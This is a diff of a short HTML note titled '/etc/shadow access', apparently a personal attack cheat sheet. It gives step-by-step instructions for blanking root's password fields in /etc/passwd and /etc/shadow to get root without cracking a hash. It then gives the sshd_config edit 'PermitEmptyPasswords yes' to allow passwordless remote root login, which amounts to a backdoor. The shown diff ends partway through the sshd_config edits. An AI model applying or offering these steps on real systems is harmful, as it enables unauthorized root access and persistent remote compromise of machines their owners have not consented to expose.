@@ -3,17 +3,19 @@
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <title>/etc/shadow access</title>
-</head><body>If you have the ability to edit /etc/shadow and etc/passwd, you might be able to obtain root access. <br/>
+</head><body>If you have the ability to edit /etc/shadow and etc/passwd, you might be able to obtain root access without cracking. <br/>
 <br/>
 in /etc/passwd, remove the x after root<br/>
-ie: root:x:0:0:root:/root:/bin/bash change to<br/>
-root::0:0:root:/root:/bin/bash<br/>
+ie: <br/>
+&nbsp; &nbsp; &nbsp;root:x:0:0:root:/root:/bin/bash change to<br/>
+&nbsp; &nbsp; &nbsp;root::0:0:root:/root:/bin/bash<br/>
 <br/>
 in /etc/shadow &nbsp;remove everything between the colons<br/>
-is: root:&lt;SOMEHASH&gt;:&lt;NUM&gt;:0:&lt;NUM&gt;:&lt;NUM&gt;::: to <br/>
-root:::::::: (don't add or remove colons, just the stuff between them)<br/>
+ie: <br/>
+&nbsp; &nbsp; &nbsp;root:&lt;SOMEHASH&gt;:&lt;NUM&gt;:0:&lt;NUM&gt;:&lt;NUM&gt;::: to <br/>
+&nbsp; &nbsp; &nbsp;root:::::::: (don't add or remove colons, just the stuff between them)<br/>
 <br/>
-now, the root user has no password (or just log in?), change the ssh config to allow remote login with no password<br/>
+now, the root user has no password (or just log in if ssh allows), change the ssh config to allow remote login with no password<br/>
 <br/>
 Edit two lines /etc/ssh/sshd_config:<br/>
 PermitEmptyPasswords yes<br/>
